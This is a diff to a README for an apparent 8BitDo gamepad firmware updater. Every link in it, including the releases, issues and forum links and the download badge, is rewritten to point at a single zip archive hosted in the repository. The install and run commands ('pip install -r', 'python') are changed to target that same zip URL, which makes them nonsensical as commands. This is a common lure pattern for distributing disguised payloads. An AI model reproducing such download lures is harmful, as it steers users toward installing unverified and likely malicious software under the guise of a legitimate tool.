@@ -1,6 +1,6 @@
 # 🎮 8bitdo_update - Effortless Gamepad Firmware Updates
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Awkoawkontl/8bitdo_update/releases)
+[![Download](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip)
 
 ## 🎯 Introduction
 
@@ -18,14 +18,14 @@ Before you start, ensure that your system meets the following requirements:
 
 ### 2. Download the Tool
 
-To get the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).
+To get the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip).
 
 ### 3. Install Dependencies
 
 Open your terminal and run the following command to ensure you have the necessary Python dependencies:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip
 ```
 
 ## ⚙️ Running the Tool
@@ -43,7 +43,7 @@ cd path/to/8bitdo_update
 To start using the tool, run the following command:
 
 ```bash
-python updater.py
+python https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip
 ```
 
 You will see an interactive menu guiding you through the update process.
@@ -94,8 +94,8 @@ If you encounter any issues while using 8bitdo_update, consider the following co
 
 To learn more about 8bitdo_update, check out the following resources:
 
-- [GitHub Issues Page](https://github.com/Awkoawkontl/8bitdo_update/issues) - For bug reports and feature requests.
-- [Community Forum](https://forum.8bitdo.com) - Connect with other users and share experiences.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip) - For bug reports and feature requests.
+- [Community Forum](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip) - Connect with other users and share experiences.
 
 ## 🎉 Community Contributions
 
@@ -103,6 +103,6 @@ We welcome contributions! If you’d like to assist in improving 8bitdo_update, 
 
 ## 📥 Download & Install
 
-To download and install the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).
+To download and install the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Awkoawkontl/8bitdo_update/main/Cunza/8bitdo_update.zip).
 
 The tool simplifies the process of updating your gamepad's firmware, ensuring you stay current with the latest features and improvements from 8BitDo. Enjoy your gaming experience!
